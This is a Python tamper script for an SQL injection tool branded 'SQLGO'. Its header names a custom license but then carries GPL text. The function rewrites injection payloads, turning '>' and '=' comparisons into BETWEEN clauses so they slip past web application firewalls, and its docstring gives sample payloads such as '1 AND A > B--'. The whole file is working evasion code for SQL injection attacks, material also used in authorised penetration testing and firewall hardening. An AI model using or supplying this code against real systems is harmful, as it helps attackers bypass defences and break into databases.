#!/usr/bin/env python
"""
# SQLGO License - Version 1.3

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""
import re



def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' and equals operator ('=') with 'BETWEEN # AND #'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The BETWEEN clause is SQL standard. Hence, this tamper script
          should work against all (?) databases

    >>> tamper('1 AND A > B--')
    '1 AND A NOT BETWEEN 0 AND B--'
    >>> tamper('1 AND A = B--')
    '1 AND A BETWEEN B AND B--'
    >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')
    '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'
    """

    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^>]+?)\s*>\s*([^>]+)\s*\Z", payload)

        if match:
            _ = "%s %s NOT BETWEEN 0 AND %s" % (match.group(2), match.group(4), match.group(5))
            retVal = retVal.replace(match.group(0), _)
        else:
            retVal = re.sub(r"\s*>\s*(\d+|'[^']+'|\w+\(\d+\))", r" NOT BETWEEN 0 AND \g<1>", payload)

        if retVal == payload:
            match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*=\s*([\w()]+)\s*", payload)

            if match:
                _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                retVal = retVal.replace(match.group(0), _)

    return retVal
